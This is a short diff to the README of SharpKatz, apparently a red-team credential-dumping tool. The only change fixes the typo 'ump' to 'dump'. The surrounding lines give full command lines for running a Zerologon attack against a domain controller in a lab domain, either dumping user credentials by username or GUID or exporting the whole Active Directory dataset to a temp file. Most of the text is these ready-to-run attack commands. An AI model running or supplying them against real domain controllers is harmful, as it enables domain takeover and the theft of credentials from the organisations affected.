@@ -95,7 +95,7 @@ Perform Zerologon attack <br>
 Perform Zerologon attack and dump user credential by username <br>
 <br>
 ```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --Guid guid --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
-Perform Zerologon attack and ump user credential by GUID <br>
+Perform Zerologon attack and dump user credential by GUID <br>
 <br>
 ```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
 Perform Zerologon attack and export the entire dataset from AD to a file created in the current user's temp forder<br>
